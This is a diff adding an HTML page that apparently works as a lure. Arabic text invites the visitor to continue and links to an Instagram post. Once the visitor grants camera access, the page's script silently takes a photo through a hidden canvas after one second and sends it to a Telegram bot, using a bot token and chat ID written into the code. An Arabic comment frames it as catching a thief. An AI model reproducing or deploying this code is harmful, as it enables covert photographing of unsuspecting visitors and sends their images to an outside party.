@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Capture Image</title>
+</head>
+<body>
+    <h2>اضغط هنا للمتابعة</h2>
+    <p><a href="https://www.instagram.com/p/CXjKivFs8xY/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==" target="_blank">افتح هذا الرابط لمشاهدة البوست على إنستاجرام</a></p>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas> <!-- مخفي عن السارق -->
+
+    <script>
+        var video = document.getElementById('video');
+        var canvas = document.getElementById('canvas');
+        var context = canvas.getContext('2d');
+
+        // Request camera access
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                video.srcObject = stream;
+                setTimeout(captureImage, 1000); // التقط الصورة بعد ثانية واحدة
+            })
+            .catch(function(err) {
+                console.log("Error: " + err);
+            });
+
+        // Capture image automatically
+        function captureImage() {
+            context.drawImage(video, 0, 0, 320, 240);
+            var imageData = canvas.toDataURL('image/png');
+            sendImageToBot(imageData); // Send the image to Telegram bot
+        }
+
+        // Send image to Telegram bot
+        function sendImageToBot(imageData) {
+            var token = '7698721068:AAG-AqkGJdmOttlZXZGrI0I0X3ZZnuGmNyE';  // Your bot token
+            var chat_id = '7153949032';  // Your chat ID
+            var url = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chat_id}&photo=${imageData}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch(error => console.log('Error:', error));
+        }
+    </script>
+</body>
+</html>
